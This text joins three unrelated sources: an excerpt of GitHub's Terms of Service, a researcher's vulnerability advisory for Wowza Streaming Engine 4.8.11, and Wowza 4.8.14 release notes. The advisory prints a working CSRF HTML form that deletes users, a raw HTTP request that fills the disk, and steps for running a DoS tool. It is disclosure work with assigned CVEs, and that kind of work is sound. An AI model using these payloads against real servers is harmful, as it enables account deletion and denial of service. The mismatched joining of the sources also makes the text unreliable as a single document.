* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

GitHub does not warrant that the Service will meet your requirements; that the Service will be uninterrupted, timely, secure, or error-free; that the information provided through the Service is accurate, reliable or correct; that any defects or errors will be corrected; that the Service will be available at any particular time or location; or that the Service is free of viruses or other harmful components. You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

* the use, disclosure, or display of your User-Generated Content;
* your use or inability to use the Service;
* any modification, price change, suspension or discontinuance of the Service;
* the Service generally or the software or systems that make the Service available;
* unauthorized access to or alterations of your transmissions or data;
* statements or conduct of any third party on the Service;
* any other user interactions that you input or receive through your use of the Service; or
* any other matter relating to the Service.

Our liability is limited whether or not we have been informed of the possibility of such damages, and even if a remedy set forth in this Agreement is found to have failed of its essential purpose. We will have no liability for any failure or delay due to matters beyond our reasonable control.

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

We reserve the right at any time and from time to time to modify or discontinue, temporarily or permanently, the Website (or any part of it) with or without notice.

## [R. Miscellaneous](#r-miscellaneous)

### [1. Governing Law](#1-governing-law)

Except to the extent applicable law provides otherwise, this Agreement between you and GitHub and any access to or use of the Website or the Service are governed by the federal laws of the United States of America and the laws of the State of California, without regard to conflict of law provisions. You and GitHub agree to submit to the exclusive jurisdiction and venue of the courts located in the City and County of San Francisco, California.

### [2. Non-Assignability](#2-non-assignability)

GitHub may assign or delegate these Terms of Service and/or the [GitHub Privacy Statement](https://github.com/site/privacy), in whole or in part, to any person or entity at any time with or without your consent, including the license grant in Section D.4.

### [4. Severability, No Waiver, and Survival](#4-severability-no-waiver-and-survival)

If any part of this Agreement is held invalid or unenforceable, that portion of the Agreement will be construed to reflect the parties’ original intent. The remaining portions will remain in full force and effect. Any failure on the part of GitHub to enforce any provision of this Agreement will not be considered a waiver of our right to enforce such provision. Our rights under this Agreement will survive any termination of this Agreement.

### [5. Amendments; Complete Agreement](#5-amendments-complete-agreement)

This Agreement may only be modified by a written amendment signed by an authorized representative of GitHub, or by the posting by GitHub of a revised version in accordance with [Section Q. Changes to These Terms](#q-changes-to-these-terms).

# Wowza Streaming Engine - Multiple Vulnerabilities

* Oct 6, 2021
* 6 minutes read

[![]()](https://n4nj0.github.io/advisories/wowza-streaming-engine-i/ "Wowza Streaming Engine - Multiple Vulnerabilities")
## TL;DR

I have found two security issues on Wowza Streaming Engine <= 4.8.11+5:

**1 - Cross-Site Request Forgery (CSRF) - CWE-352**: A remote attacker is able to delete a user account via the /enginemanager/server/user/delete.htm `userName` parameter. The application does not implement a CSRF token for the GET request.

**2 - Uncontrolled Resource Consumption - CWE-400**: A remote attacker is able to exhaust filesystem resources via the /enginemanager/server/vhost/historical.jsdata `vhost` parameter. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management.

## Product Information

* **Product Line:** Wowza Streaming Engine
* **Vulnerable Version:** 4.8.11+5
* **Product Web Page:** <https://www.wowza.com/products/streaming-engine>

Wowza Streaming Engine (known as Wowza Media Server) is a unified streaming media server software developed by Wowza Media Systems based in Colorado, in the United States of America and used by many US government entities such as NASA, US Air force, Boeing, New York Police Department and many other clients around the world.

## Vulnerability Details

### **1 - Cross-Site Request Forgery (CSRF) - CWE-352**

* **Summary:** A remote attacker is able to delete a user without the victim’s knowledge, by enticing an authenticated admin user to visit an attacker’s web page. The application does not implement a CSRF token for the GET request. An attacker can craft an HTML page with a forged request on /enginemanager/server/user/delete.htm URL and send it to the victim.
* **Prerequisites:** None.
* **CVE and CVSS Score:** [CVE-2021-35491](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35491) | [**8.1** (High)](https://nvd.nist.gov/vuln/detail/CVE-2021-35491)

**Step-by-step instructions and PoC**

An authenticated user that visits a crafted HTML page with a forged request can delete a user on Wowza Streaming Engine on behalf of an administrator.

**Affected Endpoints**

* **URL:** <http://wse.local:8088/enginemanager/server/user/delete.htm>
* **HTTP Parameter:** userName

Below are the evidences with the vulnerability details and the payloads used.

First, create a new user from **Server** -> **Users** -> **Add User**.

![CSRF - User creation](/images/11107100fccd4ef3e37eaa455c75998d.png)

Then, **Copy** the following HTML to a file served on another machine, in this case a local Kali Linux, in the file: `/var/www/html/csrf-delete-user.html`

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wse.local:8088/enginemanager/server/user/delete.htm">
      <input type="hidden" name="userName" value="pippo" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

Enable the local web server on the attacker machine:

```
sudo /etc/init.d/apache2 start

```

From an authenticated browser session to Wowza Streaming Engine with administrative privileges, open a new tab and go to the page <http://127.0.0.1/csrf-delete-user.html>.

![CSRF - PoC HTML page](/images/c9083d8eb67a0bbc1380f4d443015070.png)

Select **Submit request**, to force the administrator to delete the selected user.

The request will be sent to the web application, and the user will be deleted:

![CSRF - User deleted](/images/78625fe99a5c87bef165c60c492a5948.png)

It was also found that the `wowzaSecurityToken` HTTP parameter is not present in this GET request. In this case, the application accepts the request and processes it every time.

This is not true in the case of user creation, where that parameter is present and correctly validated.

**Security Impact**

By exploiting this issue, a remote attacker is able to delete every user on Wowza Streaming Engine on behalf of a regular platform administrator.

### **2 - Uncontrolled Resource Consumption - CWE-400**

* **Summary:** An authenticated user that views Virtual Host Monitoring historical data is able to forge an HTTP request to view a non-existing virtual host. Each time a new virtual host is requested, a 280 KB file is created on the filesystem. By randomly choosing different virtual host names, a malicious attacker is able to exhaust filesystem resources, resulting in a denial of service (DoS) condition on the affected application.
* **Prerequisites:** Valid user session with the privileges to view Virtual Host Monitoring on Wowza Streaming Engine web interface.
* **CVE and CVSS Score:** [CVE-2021-35492](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35492) | [**6.5** (Medium)](https://nvd.nist.gov/vuln/detail/CVE-2021-35492)

**Step-by-step instructions and PoC**

A remote user, authenticated to the Wowza Streaming Engine web interface, through **Virtual Host Monitoring** section, could exhaust filesystem resources, resulting in a denial of service (DoS) condition on an affected application. This vulnerability is due to the insufficient management of available filesystem resources. An attacker could exploit this vulnerability by requesting random virtual host historical data and exhausting available filesystem resources. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management. Manual intervention is required to free filesystem resources and return the application to an operational state.

**Affected Endpoints**

* **URL:** <http://wse.local:8088/enginemanager/server/vhost/historical.jsdata>
* **HTTP Parameters:** vhost

Below are the evidences with the vulnerability details and the payloads used.

To exploit the vulnerability, intercept the browser session with a proxy like [**Burp Suite**](https://portswigger.net/burp).

Then, go to the **Virtual Host Monitoring** section:

![DoS - Virtual Host Monitoring - Web Interface](/images/77ac1d79a117b8d1f0922edaf04af168.png)

An HTTP request will be automatically performed to view the historical data of the default virtual host.

The request on Burp Suite will be like the next screenshot.

![DoS - Regular HTTP request](/images/2090ff191739390815bd1a9ff9171c57.png)

Every time virtual host monitoring data is requested, a new file is created or appended on the filesystem.

By default, this is the starting condition on the folder `/usr/local/WowzaStreamingEngine-4.8.11+5/stats/`:

![DoS - Filesystem on normal condition](/images/c185fd4210d6610f47b09d9335c97fe3.png)

The attack can be performed using Burp Repeater, using the same request captured with the proxy, changing only the `vhost` parameter value. The response will be **HTTP 200 OK**:

![DoS - New virtual host HTTP request](/images/8ecb268be9d9f1a32bad417f729dfa7c.png)

Alternatively, the same can be achieved with the following payload:

```
GET /enginemanager/server/vhost/historical.jsdata?vhost=_defaultVHost_pippo_&periodStart=2021-06-03T13%3A47%3A44%2B02%3A00&periodEnd=2021-06-03T14%3A47%3A44%2B02%3A00&_=1622724285834 HTTP/1.1
Host: wse.local:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://wse.local:8088/enginemanager/Home.htm
Cookie: JSESSIONID=E1EC2C1050D74EB0E4DA9474789E8F5E; lastMangerHost=http%3A//127.0.0.1%3A8087; showRightRail=true; DoNotShowFTU=false; lastTab=Basic

```

On the filesystem side, a new file of 280 KB will be created, as depicted by the following screenshot:

![DoS - New virtual host file on the filesystem](/images/46b6a90a00b6794f46724d8d90a636df.png)

To massively exploit this condition, multiple requests with different `vhost` values have to be sent.

To send those requests reliably, the browser session has to be left active.

Session timeout can be prevented by installing a browser plugin like [Tab Reloader](https://addons.mozilla.org/en-US/firefox/addon/tab-reloader/) and configure it to refresh the tab every 1 minute, like the following example:

![DoS - Session timeout prevention - Tab Reloader](/images/ae417f01c15f4d4c3d130bfa2aef85fa.png)

Then it is possible to create a custom script to randomize the vhost parameter to a new value to be sent every time.

I have released a Denial of Service tool on my [GitHub repo](https://github.com/N4nj0/CVE-2021-35492).

```
./dos-exploit-wse.py

```

When executing such tool, it is possible to exhaust the filesystem by creating **5.5 GB** of files every **30 minutes**.

The effect can be summarized on the following screenshot, which depicts multiple files created on the filesystem and the difference of the **stats** directory size after 30 minutes of the tool execution:

![DoS - DoS exploit effect](/images/12a45ff9bbc0902ed9db6238e8d1a270.png)

**Security Impact**

An attacker could exploit this vulnerability to exhausting available filesystem resources. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management. Manual intervention is required to free filesystem resources and return the device to an operational state.

## New features and functionality in Wowza Streaming Engine 4.8.14

---

Wowza Streaming Engine is a robust, customizable, and scalable media server software that powers reliable streaming of high-quality video and audio to any device, anywhere. Wowza Streaming Engine 4.8.14 contains several enhancements and fixes that help to improve the functionality of the media server software.

#### Upgrade to CUDA 11

With Wowza Streaming Engine 4.8.14, we've upgraded CUDA support to CUDA 11 for NVIDIA GPU-accelerated live stream transcoding. This upgrade supports using the latest NVIDIA drivers for transcoding at greater scale and speed. The NVIDIA microarchitecture of your hardware must support CUDA 11, and using NVIDIA driver version 460.00 or later is required.

With this upgrade, using Kepler GPUs and CUDA decoding are not supported. For NVIDIA accelerated decoding, use the NVCUVID (also known as NVDEC) implementation instead. For more information about NVIDIA hardware acceleration, see the following the article:

* [Server specifications for NVIDIA acceleration with Wowza Streaming Engine transcoding](/docs/server-specifications-for-nvidia-acceleration-with-wowza-transcoder "Server specifications for NVIDIA acceleration with Wowza Streaming Engine transcoding")

#### Beamr replacement of MainConcept for H.264 and HEVC/H.265 transcoding

This release sunsets support for MainConcept H.264 and HEVC/H.265 video transcoding and updates the Default encoding and decoding implementations for H.264 and HEVC/H.265 video to Beamr. Beamr is a state-of-the-art encoder and decoder for high quality video and efficient transcoding. If you update to Wowza Streaming Engine 4.8.14 from an earlier version, existing Transcoder templates that use the Default encoding or decoding implementation for H.264 and HEVC/H.265 video will automatically start using Beamr.

## Installation and update considerations for Wowza Streaming Engine 4.8.14

---

> **Important:** If your workflow requires using graphic overlays and NVIDIA CUDA scaling on Windows, installing or updating to Wowza Streaming Engine 4.8.14 is not recommended due to a [known issue](/docs/known-issues-with-wowza-streaming-engine#overlays-windows "Known issues with Wowza Streaming Engine") with this functionality. We plan to address this issue in a future release.

Wowza Streaming Engine 4.8.5 and later installs a custom packaged version of OpenJDK Java SE JRE 9.0.4 that includes the java.scripting module. This module is required for Wowza Streaming Engine 4.8.14 but is not added by the Wowza Streaming Engine 4.8.14 updater. If you are updating to Wowza Streaming Engine 4.8.14 from a base installation of Wowza Streaming Engine 4.8.0 or earlier, before you update, you need to install a supported version of Java that contains the java.scripting module, such as Java 9-12 or the custom version of OpenJDK Java SE JRE 9.0.4 installed with Wowza Streaming Engine 4.8.14 (available from the **Downloads** tab of [My Account](https://portal.wowza.com/account/downloads)). Then instruct Wowza Streaming Engine to use that version of Java according to the instructions in [Manually install and troubleshoot Java on Wowza Streaming Engine](/docs/manually-install-and-troubleshoot-java-on-wowza-streaming-engine "Manually install and troubleshoot Java on Wowza Streaming Engine").

